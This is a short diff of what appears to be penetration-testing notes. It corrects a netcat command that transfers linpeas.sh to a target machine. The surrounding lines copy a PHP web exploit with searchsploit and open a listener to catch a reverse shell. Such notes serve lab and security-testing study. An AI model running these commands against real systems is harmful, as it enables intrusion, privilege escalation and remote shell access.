@@ -191,7 +191,7 @@ searchsploit -m php/webapps/40700.html
 # execute on target machine (recieve)
 nc -lp 5555 > /dev/shm/linpeas.sh
 # execute on host machine (send)
-c -w 3 {host IP} 5555 < linpeas.sh
+nc -w 3 {target IP} 5555 < linpeas.sh
 
 # connect tty shell
 rlwrap nc -nlvp {port}
